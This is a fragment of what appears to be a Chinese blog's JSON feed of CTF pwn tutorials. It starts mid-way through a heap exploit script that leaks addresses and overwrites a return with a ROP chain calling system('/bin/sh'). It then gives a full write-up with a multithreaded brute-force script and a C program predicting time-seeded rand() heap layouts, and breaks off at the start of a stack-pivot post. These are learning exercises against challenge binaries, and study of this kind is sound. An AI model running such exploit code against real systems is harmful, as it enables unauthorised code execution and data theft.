p.sendafter(<span class=\"string\">&#x27;Description: &#x27;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">index, content</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Description: &#x27;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">## 观察怎么泄露的地址</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;test&#x27;</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;ddd&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">recv = p.recv(<span class=\"number\">0xe</span>)</span><br><span class=\"line\">fake_stack_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(fake_stack_addr))</span><br><span class=\"line\">fake_lib_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(fake_lib_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(i+<span class=\"number\">1</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">9</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">11</span>,<span class=\"string\">b&#x27;ddd&#x27;</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    delete(i+<span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">8</span>)</span><br><span class=\"line\">show(<span class=\"number\">8</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\">sec=u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">delete(<span class=\"number\">9</span>)</span><br><span class=\"line\">show(<span class=\"number\">9</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\">heap_sec=u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">heap_addr=heap_sec^sec</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\">stack_addr=u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">8</span>)</span><br><span class=\"line\">victim=stack_addr-<span class=\"number\">0x20</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(victim))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(i+<span class=\"number\">1</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">pay1=p64(sec^victim)</span><br><span class=\"line\">add(<span class=\"number\">12</span>,pay1,<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">13</span>,pay1,<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">14</span>,pay1,<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">15</span>,<span class=\"string\">b&#x27;ccc&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">15</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">pie_base_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x1794</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;pie: &#x27;</span>+<span class=\"built_in\">hex</span>(pie_base_addr))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(i+<span class=\"number\">30</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>,<span class=\"number\">0x3f8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">31</span>)</span><br><span class=\"line\">show(<span class=\"number\">31</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Name: &#x27;</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">lib_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">96</span>-<span class=\"number\">0x1f6c60</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;libc: &#x27;</span>+<span class=\"built_in\">hex</span>(lib_addr))</span><br><span class=\"line\"><span class=\"comment\">#print(p.bases)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\">system=lib_addr+libc.sym[<span class=\"string\">&quot;system&quot;</span>] <span class=\"comment\">#0x4c330</span></span><br><span class=\"line\">bin_sh=lib_addr+<span class=\"number\">0x1b61b4</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(bin_sh))</span><br><span class=\"line\"></span><br><span class=\"line\">ret=<span class=\"number\">0x00000000000233d1</span>+lib_addr</span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x00023b65</span>+lib_addr</span><br><span class=\"line\">rop_chain=p64(ret)*<span class=\"number\">0x10</span>+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class=\"line\"><span class=\"comment\">## edit</span></span><br><span class=\"line\">edit(<span class=\"number\">15</span>,rop_chain)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>, <span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/",
            "title": "pwn入门-25-高级网络攻防练习题一道",
            "date_published": "2023-05-12T14:34:02.000Z",
            "content_html": "<p>题目链接: 本链接加上 .&#x2F;pwn即可</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/image-20230512223501172.png\" alt=\"image-20230512223501172\"></p>\n<h2 id=\"程序逻辑分析\"><a href=\"#程序逻辑分析\" class=\"headerlink\" title=\"程序逻辑分析\"></a>程序逻辑分析</h2><p><img src=\"/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/image-20230512213431688.png\" alt=\"image-20230512213431688\"> </p>\n<p>​\t\t该程序是根据时间戳为随机数的种子,然后随机malloc和free一些内存,即把堆的空间打乱,然后再去给flag分配内容空间,然后把控制权交给用户,让用户进行操作.</p>\n<h2 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h2><h3 id=\"思路一-枚举\"><a href=\"#思路一-枚举\" class=\"headerlink\" title=\"思路一 枚举\"></a>思路一 枚举</h3><p>​\t\t不论是最开始的打乱堆空间还是分配flag的堆空间,堆块的大小都限定在了0x400以内,也就是tcache的范围. 换言之,堆块的大小有40种情况.</p>\n<p>​\t\tflag分配的堆块必定在这40种情况之中,如果在flag分配的时候,正好分配到了tcache中的bin,那么如果知道tcache中的这个bin的空间中的前一个bin的大小,那么就可以去申请这个bin,然后进行show打印,就有可能打印出来flag. </p>\n<p>​\t\t举例:</p>\n<p>​\t\t先随机化分配了一些堆块</p>\n<p>​\t\t0x100</p>\n<p>​\t\t0x40</p>\n<p>​\t\t0x30</p>\n<p>​\t\t0x50</p>\n<p>​\t\t0x40</p>\n<p>​\t\t然后释放了一些堆块</p>\n<p>​\t\t0x100</p>\n<p>​\t<font color=\"red\">\t0x40\t</font></p>\n<p>​\t\t0x30</p>\n<p><font color=\"red\">\t\t0x50</font></p>\n<p>​\t\t0x40</p>\n<p>​\t\t申请flag堆块</p>\n<p>​\t\t0x100</p>\n<p><font color=\"red\">\t\t0x40</font></p>\n<p>​\t\t0x30</p>\n<p>​\t\t<font color=\"blue\">0x50 flag</font> </p>\n<p>​\t\t0x40</p>\n<p>​\t\t此时,如果能够申请到0x40的空闲堆块,然后进行打印,就有可能会打印出来flag</p>\n<p>​\t\t这种方法存在一定的约束条件:</p>\n<p>​\t\t1.根据tcache的后进先出原则,flag前的空闲堆块需要是最后一个释放的空间,不然的话就要先申请它后面的tcache bin</p>\n<p>​\t\t2.flag的堆块与前面一个空闲堆块的距离要小于show能打印的范围</p>\n<p>​\t\t</p>\n<p>​\t\t不过随着尝试的次数增多,总会有满足这两个约束条件的情况,利用多线程,申请0x10,0x20,0x30….0x400大小的堆块,可以满足所有的情况,那么唯一不确定的就是是否符合约束条件,但通过该种尝试,也大大提高了枚举的成功率</p>\n<h4 id=\"exp攻击脚本\"><a href=\"#exp攻击脚本\" class=\"headerlink\" title=\"exp攻击脚本\"></a>exp攻击脚本</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">brute_force</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">    p = remote(<span class=\"string\">&quot;xxxx&quot;</span>, xxxxx)</span><br><span class=\"line\">    context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;Index: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;Size: &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;Data: &quot;</span>,<span class=\"string\">&quot;aaa&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&quot;Index: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    recv = p.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">b&quot;flag&quot;</span> <span class=\"keyword\">in</span> recv:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(recv)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">            p.sendlineafter(<span class=\"string\">&quot;Index: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">            recv = p.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    threads = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0x10</span>, <span class=\"number\">0x410</span>, <span class=\"number\">0x10</span>):</span><br><span class=\"line\">        t = threading.Thread(target=brute_force, args=(i,))</span><br><span class=\"line\">        threads.append(t)</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> threads:</span><br><span class=\"line\">        t.join()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>把输出 重定向到1.txt 一次不一定能成功,一般几次就可以了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/image-20230512214621634.png\" alt=\"image-20230512214621634\"></p>\n<h3 id=\"思路二\"><a href=\"#思路二\" class=\"headerlink\" title=\"思路二\"></a>思路二</h3><h4 id=\"漏洞点分析\"><a href=\"#漏洞点分析\" class=\"headerlink\" title=\"漏洞点分析\"></a>漏洞点分析</h4><p>​\t\t随机数种子设置代码:v3 &#x3D; time(0LL);\t\t</p>\n<p>​\t\t对随机数的种子的设置是精确到了s,所以它事实上是可以进行预测的.如果随机值是确定的,那么就可以确定后面分配了哪些堆块,释放了哪些堆块,flag申请到了哪个堆块,flag前面的空闲堆块是哪一个,都可以进行确定</p>\n<p>​\t\t如何就可以获取flag堆块前面的第一个空闲堆块的大小,也可以获取它是第几个.</p>\n<p>​\t\t然后就可以根据时间戳获取确定的解了,就可以算出即将到来的时间对应的解.在时间到来时发送payload即可.</p>\n<h4 id=\"根据时间戳获取flag堆块前一个空闲堆块脚本\"><a href=\"#根据时间戳获取flag堆块前一个空闲堆块脚本\" class=\"headerlink\" title=\"根据时间戳获取flag堆块前一个空闲堆块脚本\"></a>根据时间戳获取flag堆块前一个空闲堆块脚本</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIZE 10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">srand(<span class=\"number\">1000</span>);</span><br><span class=\"line\"><span class=\"type\">int</span> v0 = rand();</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> v1 = v0 &gt;&gt; <span class=\"number\">31</span>;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> v2 = v1 &gt;&gt; <span class=\"number\">24</span>;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> v3 = v2 + v0;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> v4 = v1 &gt;&gt; <span class=\"number\">24</span>;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> v5 = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)v3 - (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)v4;</span><br><span class=\"line\"></span><br><span class=\"line\">v3 = v5;</span><br><span class=\"line\"><span class=\"type\">void</span>** pre_sprays = <span class=\"built_in\">malloc</span>(v3 * <span class=\"keyword\">sizeof</span>(<span class=\"type\">void</span>*));</span><br><span class=\"line\"><span class=\"type\">int</span> *pre_spray_sizes = <span class=\"built_in\">malloc</span>(v3 * <span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>));</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; v3; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v1 = rand();</span><br><span class=\"line\">    pre_sprays[i] = <span class=\"built_in\">malloc</span>(v1 % <span class=\"number\">1024</span>);</span><br><span class=\"line\">    pre_spray_sizes[i] = malloc_usable_size(pre_sprays[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;v3;++i)&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,pre_spray_sizes[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"type\">int</span> *pre_free_sizes = <span class=\"built_in\">malloc</span>(v3 * <span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>));</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( <span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; v3; ++j )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v1 = rand();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( ( v1 &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      pre_free_sizes[j] = pre_spray_sizes[j];</span><br><span class=\"line\">      <span class=\"built_in\">free</span>(pre_sprays[j]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> j=<span class=\"number\">0</span>;j&lt;v3;++j)&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;index:%d, size:%d\\n&quot;</span>,j,pre_free_sizes[j]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    v1 = rand() % <span class=\"number\">982</span> + <span class=\"number\">42</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span>* flagaddr = <span class=\"built_in\">malloc</span>(v1);</span><br><span class=\"line\">    <span class=\"type\">int</span> flagsize = malloc_usable_size(flagaddr);</span><br><span class=\"line\">    v1 = rand();</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;flag size:%d\\n&quot;</span>,flagsize);</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"type\">int</span> tmp;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = v3 - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pre_free_sizes[i] == flagsize) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d is the index\\n&quot;</span>,i);</span><br><span class=\"line\">        tmp = i;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = tmp - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pre_free_sizes[i]!= <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;index: %d , size: %d &quot;</span>,i,pre_free_sizes[i]);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t根据这个脚本可以获取flag堆块前面一个空闲堆块的位置和大小,(脚本有待完善,没有判断是第几个,大小貌似也有点问题)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/image-20230512215715328.png\" alt=\"image-20230512215715328\"></p>\n<p>还有就是可以同时多开几个不同的大小的,一起尝试</p>\n<h2 id=\"技术点总结\"><a href=\"#技术点总结\" class=\"headerlink\" title=\"技术点总结\"></a>技术点总结</h2><p>1.c语言随机数函数srand、rand的理解</p>\n<p>​\t\t其实这是个伪随机数函数,如果能确定srand的输入,那么随机数的种子就是确定的,rand得到的随机数的值也是确定的.</p>\n<p>2.对堆块布局的理解</p>\n<p>​\t\t在没有bin的情况下,堆的申请在堆内存中是连续的,所以堆块之间都是相邻的,如果想要获取一个堆块的信息,可以通过与它相临的堆块的越界读取来获得.</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/",
            "title": "pwn入门-24-栈迁移练习题3道",
            "date_published": "2023-04-10T03:48:31.000Z",
            "content_html": "<h1 id=\"1-极客大挑战-2019-Not-Bad\"><a href=\"#1-极客大挑战-2019-Not-Bad\" class=\"headerlink\" title=\"1.[极客大挑战 2019]Not Bad\"></a>1.[极客大挑战 2019]Not Bad</h1><h2 id=\"分析反编译代码及保护\"><a href=\"#分析反编译代码及保护\" class=\"headerlink\" title=\"分析反编译代码及保护\"></a>分析反编译代码及保护</h2><p>​\t\tUbuntu 18   2.23libc也就是说理论上</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall main(<span class=\"built_in\">int</span> a1, char **a2, char **a3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  mmap((void *)<span class=\"number\">0x123000</span>, 0x1000uLL, <span class=\"number\">6</span>, <span class=\"number\">34</span>, -<span class=\"number\">1</span>, 0LL);</span><br><span class=\"line\">  sub_400949();</span><br><span class=\"line\">  sub_400906();</span><br><span class=\"line\">  